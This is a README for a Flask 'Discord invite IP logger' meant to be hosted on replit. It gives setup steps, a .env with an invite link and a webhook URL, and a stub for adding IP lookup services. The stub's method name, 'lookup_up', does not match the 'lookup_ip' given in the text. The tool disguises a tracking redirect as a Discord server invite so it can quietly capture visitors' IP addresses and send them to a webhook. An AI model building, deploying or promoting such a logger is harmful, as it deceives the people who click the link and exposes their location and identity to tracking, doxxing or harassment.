<h1 align="center">DISCORD INVITE IP LOGGER</h1>
Redirect IP logger using flask. Ideally hosted on replit.

<br>

<h1>Setup</h1>

```
pip install -r requirements.txt
```

Create a `.env` file

```
INVITE_LINK='<server invite>'
WEBHOOK_LINK='<webhook url>'
```

<br>

<h1>Flexibility</h1>

You can always add an IP lookup service by inheriting from `IpLookup` and adding `lookup_ip` function.

<br>

i.e

```py
from services.ip_lookup import IpLookup

class YourLookupService(IpLookup):
    def __init__(self, ip_addr):
        self.ip_addr = ip_addr

    def lookup_up(self):
        # do your thing and return an embed field
        pass
```

then import and add your class to `services`.